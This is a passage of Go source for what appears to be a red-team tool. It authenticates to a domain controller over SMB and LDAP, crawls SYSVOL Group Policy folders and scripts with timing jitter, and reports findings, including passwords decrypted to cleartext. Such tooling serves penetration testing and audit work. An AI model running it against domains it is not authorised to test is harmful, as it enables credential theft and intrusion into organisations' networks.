	}

	var recurse func(path string)
	recurse = func(path string) {
		entries, err := smbs.listDir(path)
		jitter()
		if err != nil {
			if verbose {
				warn("listDir %s: %v", path, err)
			}
			return
		}
		for _, e := range entries {
			name := e.Name()
			if name == "." || name == ".." {
				continue
			}
			full := path + "\\" + name
			if e.IsDir() {
				recurse(full)
				continue
			}

			result.Files = append(result.Files, full)
			nameLower := strings.ToLower(name)

			// Interesting policy files
			if fi, ok := interestingFiles[nameLower]; ok {
				data, err := smbs.readFile(full)
				jitter()
				if err != nil || fi.Parser == nil {
					continue
				}
				for _, f := range fi.Parser(data) {
					f.File      = full
					f.FileLabel = fi.Label
					result.Findings = append(result.Findings, f)
				}
				if verbose {
					info("  [%s] %s (%d bytes)", fi.Label, full, len(data))
				}
				continue
			}

			// Script files
			dotIdx := strings.LastIndexByte(name, '.')
			if dotIdx < 0 {
				continue
			}
			ext := strings.ToLower(name[dotIdx:])
			if scriptExts[ext] {
				data, err := smbs.readFile(full)
				jitter()
				if err != nil {
					continue
				}
				for _, f := range parseScript(full, data) {
					f.File      = full
					f.FileLabel = "Script"
					result.Findings = append(result.Findings, f)
				}
			}
		}
	}

	recurse(gpoPath)
	return result
}

// ─────────────────────────────────────────────────────────────
// Report printer
// ─────────────────────────────────────────────────────────────

var sevColour = map[string]string{
	"CRITICAL": cRed,
	"HIGH":     cYel,
	"MEDIUM":   cLime,
	"INFO":     cGrey,
}

func printReport(results []GPOResult, showAll bool) {
	total := 0
	for _, r := range results {
		total += len(r.Findings)
	}

	fmt.Println()
	header(fmt.Sprintf("GPO Enumeration Results — %d GPOs  |  %d findings", len(results), total))

	for _, r := range results {
		if len(r.Findings) == 0 && !showAll {
			continue
		}
		flagStr := ""
		switch r.Flags {
		case "1":
			flagStr = cYel + "  [USER disabled]" + cReset
		case "2":
			flagStr = cYel + "  [COMPUTER disabled]" + cReset
		case "3":
			flagStr = cRed + "  [ALL disabled]" + cReset
		}
		fmt.Printf("  %s%s%s%s%s\n", cBold+cLime, r.DisplayName, cReset, flagStr, "")
		fmt.Printf("  %s%-10s%s {%s}\n", cGrey, "GUID", cReset, strings.ToUpper(r.GUID))
		fmt.Printf("  %s%-10s%s %s  |  files: %d\n", cGrey, "Version", cReset, r.Version, len(r.Files))
		for _, link := range r.Links {
			fmt.Printf("  %s%-10s%s %s\n", cGrey, "Linked", cReset, link)
		}

		if len(r.Findings) > 0 {
			for _, f := range r.Findings {
				sc := sevColour[f.Severity]
				fmt.Printf("\n    %s%s[%s]%s  %s\n", cBold, sc, f.Severity, cReset, f.Description)
				if f.FileLabel != "" {
					fmt.Printf("    %s│%s %sfile:%s %s\n", cGrey, cReset, cGrey, cReset, f.File)
				}
				if f.Detail != "" {
					fmt.Printf("    %s│%s %s%s%s\n", cGrey, cReset, cGrey, f.Detail, cReset)
				}
				if f.Decrypted != "" {
					fmt.Printf("    %s│%s %s%sCleartext:%s %s%s\n", cGrey, cReset, cBold, cRed, cReset, f.Decrypted, cReset)
				}
			}
		}
		fmt.Println()
	}

	// Summary
	sevCounts := map[string]int{}
	for _, r := range results {
		for _, f := range r.Findings {
			sevCounts[f.Severity]++
		}
	}
	if len(sevCounts) > 0 {
		section("Finding Summary")
		fmt.Println()
		for _, sev := range []string{"CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"} {
			if n, ok := sevCounts[sev]; ok {
				sc := sevColour[sev]
				fmt.Printf("  %s%s%-10s%s %d\n", cBold, sc, sev, cReset, n)
			}
		}
	}
	fmt.Printf("\n%s%s%s\n\n", cBold+cWhite, strings.Repeat("─", 60), cReset)
}

// ─────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────

func atoi(s string) int {
	n := 0
	fmt.Sscanf(s, "%d", &n)
	return n
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}


// ─────────────────────────────────────────────────────────────
// main
// ─────────────────────────────────────────────────────────────

func main() {
	stamp := time.Now().Format("20060102_150405")
	fmt.Print(banner)
	o := parseArgs()

	// ── Output directory setup
	outDir := o.Outfile
	if outDir == "" {
		outDir = "sysvol_" + stamp
	}
	if err := os.MkdirAll(outDir, 0755); err != nil {
		fmt.Fprintf(os.Stderr, cRed+"[-]"+cReset+" Cannot create output dir: %v\n", err)
		os.Exit(1)
	}

	// Tee stdout → report.txt (captures full console output including progress)
	reportPath := filepath.Join(outDir, "report.txt")
	logFile, logErr := os.Create(reportPath)
	if logErr == nil {
		pipeR, pipeW, pipeErr := os.Pipe()
		if pipeErr == nil {
			origStdout := os.Stdout
			os.Stdout = pipeW
			teeDone := make(chan struct{})
			go func() {
				io.Copy(io.MultiWriter(origStdout, logFile), pipeR)
				close(teeDone)
			}()
			defer func() {
				pipeW.Close()
				<-teeDone
				logFile.Close()
			}()
		}
	}

	// ── SMB connection
	info("Connecting to %s over SMB...", o.DC)
	smbs, err := connectSMB(o)
	if err != nil {
		fmt.Fprintf(os.Stderr, cRed+"[-]"+cReset+" SMB failed: %v\n", err)
		os.Exit(1)
	}
	defer smbs.close()
	good("SMB authenticated as %s\\%s", o.Domain, o.Username)

	// ── Engagement context
	ts := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
	fmt.Println()
	fmt.Printf("  %sTarget%s  : %s\n", cBold+cLime, cReset, o.DC)
	fmt.Printf("  %sDomain%s  : %s\n", cBold+cLime, cReset, o.sysvol())
	fmt.Printf("  %sUser%s    : %s\\%s\n", cBold+cLime, cReset, o.Domain, o.Username)
	fmt.Printf("  %sOutput%s  : %s\n", cBold+cLime, cReset, outDir)
	fmt.Printf("  %sStarted%s : %s\n", cBold+cLime, cReset, ts)
	fmt.Println()

	// ── LDAP connection for GPO name resolution
	info("Resolving GPO names via LDAP...")
	lc, err := connectLDAP(o)
	if err != nil {
		warn("LDAP failed (%v) — will use GUIDs only", err)
		lc = nil
	}

	gpoNames := map[string]gpoMeta{}
	gpoLinks := map[string][]string{}
	if lc != nil {
		gpoNames, _ = getGPONames(lc)
		gpoLinks, _  = getGPOLinks(lc)
		lc.conn.Close()
		good("Resolved %d GPO display names from LDAP", len(gpoNames))
	}

	// ── Enumerate SYSVOL\<domain>\Policies
	policiesPath := fmt.Sprintf("%s\\Policies", o.sysvol())
	info("Enumerating SYSVOL: \\\\%s\\SYSVOL\\%s", o.DC, policiesPath)

	topEntries, err := smbs.listDir(policiesPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, cRed+"[-]"+cReset+" Failed to list Policies: %v\n", err)
		os.Exit(1)
	}

	type gpoDir struct {
		GUID string
		Path string
	}
	var gpoDirs []gpoDir
	for _, e := range topEntries {
		name := e.Name()
		if name == "." || name == ".." || !e.IsDir() {
			continue
		}
		guid := strings.ToLower(strings.Trim(name, "{}"))
		gpoDirs = append(gpoDirs, gpoDir{
			GUID: guid,
			Path: policiesPath + "\\" + name,
		})
	}
	good("Found %d GPO directories in SYSVOL", len(gpoDirs))

	// ── Filter to a single policy if requested
	if o.Policy != "" {
		needle := strings.ToLower(strings.Trim(o.Policy, "{}"))
		var filtered []gpoDir
		for _, gd := range gpoDirs {
			guidMatch := strings.Contains(gd.GUID, needle)
			nameMatch := strings.Contains(strings.ToLower(gpoNames[gd.GUID].DisplayName), needle)
			if guidMatch || nameMatch {
				filtered = append(filtered, gd)
			}
		}
		if len(filtered) == 0 {
			fmt.Fprintf(os.Stderr, cRed+"[-]"+cReset+" No GPO matched -policy %q\n", o.Policy)
			os.Exit(1)
		}
		info("Filtering to %d matching GPO(s) for -policy %q", len(filtered), o.Policy)
		gpoDirs = filtered
	}

	// ── Walk each GPO
	var results []GPOResult
	for i, gd := range gpoDirs {
		meta := gpoNames[gd.GUID]
		disp := meta.DisplayName
		if disp == "" {
			disp = "{GPO-" + gd.GUID + "}"
		}
		info("[%d/%d] %s", i+1, len(gpoDirs), disp)
		r := walkGPO(smbs, gd.Path, gd.GUID, meta, gpoLinks[gd.GUID], o.Verbose)
		results = append(results, r)
		jitter()
	}

	// ── Print report (also captured to report.txt via tee)
	printReport(results, o.All)

	// ── Save report.json
	jsonPath := filepath.Join(outDir, "report.json")
	if jf, err := os.Create(jsonPath); err == nil {
		enc := json.NewEncoder(jf)
		enc.SetIndent("", "  ")
		_ = enc.Encode(results)
		jf.Close()
	}

	// ── Save summary.txt (findings only, no progress noise)
	summaryPath := filepath.Join(outDir, "summary.txt")
	writeSummary(summaryPath, results, o.DC, o.sysvol(), o.Username, ts)

	good("Output saved → %s/", outDir)
}

func writeSummary(path string, results []GPOResult, target, domain, user, ts string) {
	f, err := os.Create(path)
	if err != nil {
		return
	}
	defer f.Close()

	total := 0
	for _, r := range results {
		total += len(r.Findings)
	}

	fmt.Fprintf(f, "SYSVOL GPO Enumeration Summary\n")
	fmt.Fprintf(f, "================================\n")
	fmt.Fprintf(f, "Target  : %s\n", target)
	fmt.Fprintf(f, "Domain  : %s\n", domain)
	fmt.Fprintf(f, "User    : %s\n", user)
	fmt.Fprintf(f, "Started : %s\n", ts)
	fmt.Fprintf(f, "GPOs    : %d  |  Findings: %d\n\n", len(results), total)

	sevOrder := []string{"CRITICAL", "HIGH", "MEDIUM", "INFO"}
	for _, sev := range sevOrder {
		var matches []struct {
			GPO string
			Finding
		}
		for _, r := range results {
			for _, fi := range r.Findings {
				if fi.Severity == sev {
					matches = append(matches, struct {
						GPO string
						Finding
					}{r.DisplayName, fi})
				}
			}
		}
		if len(matches) == 0 {
			continue
		}
		fmt.Fprintf(f, "[%s] (%d)\n", sev, len(matches))
		fmt.Fprintf(f, "%s\n", strings.Repeat("-", 60))
		for _, m := range matches {
			fmt.Fprintf(f, "  GPO      : %s\n", m.GPO)
			fmt.Fprintf(f, "  Finding  : %s\n", m.Description)
			if m.FileLabel != "" {
				fmt.Fprintf(f, "  File     : %s\n", m.File)
			}
			if m.Detail != "" {
				fmt.Fprintf(f, "  Detail   : %s\n", m.Detail)
			}
			if m.Decrypted != "" {
				fmt.Fprintf(f, "  Cleartext: %s\n", m.Decrypted)
			}
			fmt.Fprintln(f)
		}
	}
}
